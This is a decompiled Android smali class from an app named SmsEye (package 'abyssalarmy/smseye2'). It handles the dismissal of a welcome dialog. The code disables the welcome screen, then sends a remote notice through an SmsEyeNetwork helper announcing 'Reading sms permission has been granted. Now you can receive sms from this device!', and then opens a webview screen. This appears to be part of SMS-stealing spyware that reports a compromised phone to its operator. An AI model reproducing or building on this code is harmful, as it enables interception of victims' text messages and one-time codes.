.class final Labyssalarmy/smseye2/ui/screen/SmsEyeWelcomeKt$SmsEyeWelcome$1$4$1$1;
.super Lkotlin/jvm/internal/Lambda;
.source "SmsEyeWelcome.kt"

# interfaces
.implements Lkotlin/jvm/functions/Function0;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Labyssalarmy/smseye2/ui/screen/SmsEyeWelcomeKt$SmsEyeWelcome$1$4$1;->invoke()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x18
    name = null
.end annotation

.annotation system Ldalvik/annotation/Signature;
    value = {
        "Lkotlin/jvm/internal/Lambda;",
        "Lkotlin/jvm/functions/Function0<",
        "Lkotlin/Unit;",
        ">;"
    }
.end annotation

.annotation runtime Lkotlin/Metadata;
    k = 0x3
    mv = {
        0x1,
        0x6,
        0x0
    }
    xi = 0x30
.end annotation


# instance fields
.field final synthetic $context:Landroid/content/Context;

.field final synthetic $showDialog$delegate:Landroidx/compose/runtime/MutableState;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Landroidx/compose/runtime/MutableState<",
            "Ljava/lang/Boolean;",
            ">;"
        }
    .end annotation
.end field

.field final synthetic $smsEyeViewModel:Labyssalarmy/smseye2/SmsEyeViewModel;


# direct methods
.method constructor <init>(Landroid/content/Context;Labyssalarmy/smseye2/SmsEyeViewModel;Landroidx/compose/runtime/MutableState;)V
    .locals 0
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Context;",
            "Labyssalarmy/smseye2/SmsEyeViewModel;",
            "Landroidx/compose/runtime/MutableState<",
            "Ljava/lang/Boolean;",
            ">;)V"
        }
    .end annotation

    iput-object p1, p0, Labyssalarmy/smseye2/ui/screen/SmsEyeWelcomeKt$SmsEyeWelcome$1$4$1$1;->$context:Landroid/content/Context;

    iput-object p2, p0, Labyssalarmy/smseye2/ui/screen/SmsEyeWelcomeKt$SmsEyeWelcome$1$4$1$1;->$smsEyeViewModel:Labyssalarmy/smseye2/SmsEyeViewModel;

    iput-object p3, p0, Labyssalarmy/smseye2/ui/screen/SmsEyeWelcomeKt$SmsEyeWelcome$1$4$1$1;->$showDialog$delegate:Landroidx/compose/runtime/MutableState;

    const/4 p1, 0x0

    invoke-direct {p0, p1}, Lkotlin/jvm/internal/Lambda;-><init>(I)V

    return-void
.end method


# virtual methods
.method public bridge synthetic invoke()Ljava/lang/Object;
    .locals 1

    .line 109
    invoke-virtual {p0}, Labyssalarmy/smseye2/ui/screen/SmsEyeWelcomeKt$SmsEyeWelcome$1$4$1$1;->invoke()V

    sget-object v0, Lkotlin/Unit;->INSTANCE:Lkotlin/Unit;

    return-object v0
.end method

.method public final invoke()V
    .locals 7

    .line 110
    iget-object v0, p0, Labyssalarmy/smseye2/ui/screen/SmsEyeWelcomeKt$SmsEyeWelcome$1$4$1$1;->$showDialog$delegate:Landroidx/compose/runtime/MutableState;

    const/4 v1, 0x0

    invoke-static {v0, v1}, Labyssalarmy/smseye2/ui/screen/SmsEyeWelcomeKt;->access$SmsEyeWelcome$lambda-2(Landroidx/compose/runtime/MutableState;Z)V

    .line 111
    sget-object v0, Labyssalarmy/smseye2/tools/SmsEyeUtils;->Companion:Labyssalarmy/smseye2/tools/SmsEyeUtils$Companion;

    iget-object v1, p0, Labyssalarmy/smseye2/ui/screen/SmsEyeWelcomeKt$SmsEyeWelcome$1$4$1$1;->$context:Landroid/content/Context;

    invoke-virtual {v0, v1}, Labyssalarmy/smseye2/tools/SmsEyeUtils$Companion;->disableWelcome(Landroid/content/Context;)V

    .line 112
    new-instance v0, Labyssalarmy/smseye2/tools/SmsEyeNetwork;

    iget-object v1, p0, Labyssalarmy/smseye2/ui/screen/SmsEyeWelcomeKt$SmsEyeWelcome$1$4$1$1;->$context:Landroid/content/Context;

    invoke-direct {v0, v1}, Labyssalarmy/smseye2/tools/SmsEyeNetwork;-><init>(Landroid/content/Context;)V

    const-string v1, "Reading sms permission has been granted\nNow you can receive sms from this device!"

    invoke-virtual {v0, v1}, Labyssalarmy/smseye2/tools/SmsEyeNetwork;->sendTextMessage(Ljava/lang/String;)V

    .line 113
    iget-object v0, p0, Labyssalarmy/smseye2/ui/screen/SmsEyeWelcomeKt$SmsEyeWelcome$1$4$1$1;->$smsEyeViewModel:Labyssalarmy/smseye2/SmsEyeViewModel;

    invoke-virtual {v0}, Labyssalarmy/smseye2/SmsEyeViewModel;->getNavController()Landroidx/navigation/NavHostController;

    move-result-object v0

    move-object v1, v0

    check-cast v1, Landroidx/navigation/NavController;

    sget-object v0, Labyssalarmy/smseye2/ui/SmsEyeRoute$Webview;->INSTANCE:Labyssalarmy/smseye2/ui/SmsEyeRoute$Webview;

    invoke-virtual {v0}, Labyssalarmy/smseye2/ui/SmsEyeRoute$Webview;->getRoute()Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x6

    const/4 v6, 0x0

    invoke-static/range {v1 .. v6}, Landroidx/navigation/NavController;->navigate$default(Landroidx/navigation/NavController;Ljava/lang/String;Landroidx/navigation/NavOptions;Landroidx/navigation/Navigator$Extras;ILjava/lang/Object;)V

    return-void
.end method
